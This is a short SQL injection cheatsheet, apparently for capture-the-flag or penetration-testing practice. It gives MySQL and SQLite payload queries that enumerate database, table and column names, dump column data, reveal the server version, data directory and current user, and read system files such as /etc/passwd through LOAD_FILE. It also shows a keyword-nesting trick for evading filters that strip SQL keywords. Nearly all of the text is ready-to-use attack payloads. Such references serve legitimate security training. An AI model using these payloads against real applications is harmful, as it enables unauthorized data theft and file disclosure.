MySQL Injection Syntax Cheatsheet
=============

> John Hammond 


Leak all of the database names as a string
-----------------------------

```
SELECT GROUP_CONCAT( SCHEMA_NAME ) FROM INFORMATION_SCHEMA.SCHEMATA
```

Leak all of the tables in one database as a string
-----------

```
SELECT GROUP_CONCAT( TABLE_NAME ) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="<DATABASE_NAME>"
```

Leak the column names of a table as a string
------------------

```
SELECT GROUP_CONCAT( COLUMN_NAME ) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="<TABLE NAME>"
```

Leak the ONE column from a table
------------------

```
SELECT GROUP_CONCAT( "<COLUMN_NAME>" ) FROM "<TABLE NAME>"
```

___IF THIS DOES NOT WORK, TRY WITHOUT THE QUOTES!!___


Get the path of the running MySQL instance
------------------


```
SELECT @@datadir
```

Get the version of the running MySQL instance
------------------

```
SELECT @@version
```


Get current user
------------------


```
SELECT user();
```

```
SELECT system_user();
```

Read a file
------------------


```
SELECT LOAD_FILE("/etc/passwd");
```



Etcetera..
------

Some applications try to replace keywords with an empty string. If this is the case, try and trick it by placing the keyword inside of itself. This is devious! 

```
frfromom => from
oorr => or
loaload_filed_file => load_file
selselectect => select
```


---------------------------------

SQLite Injection
=================

Leak all the table names as a string
----------

```
SELECT GROUP_CONCAT(name) FROM sqlite_master
```

Leak all the column names from a table as a string
----------

```
SELECT GROUP_CONCAT(sql) FROM sqlite_master WHERE tbl_name = '<TABLE_NAME>' AND type = 'table'
```

Leak ONE column from a table
--------

```
SELECT GROUP_CONCAT(<COLUMN_NAME>) FROM <TABLE_NAME>
```
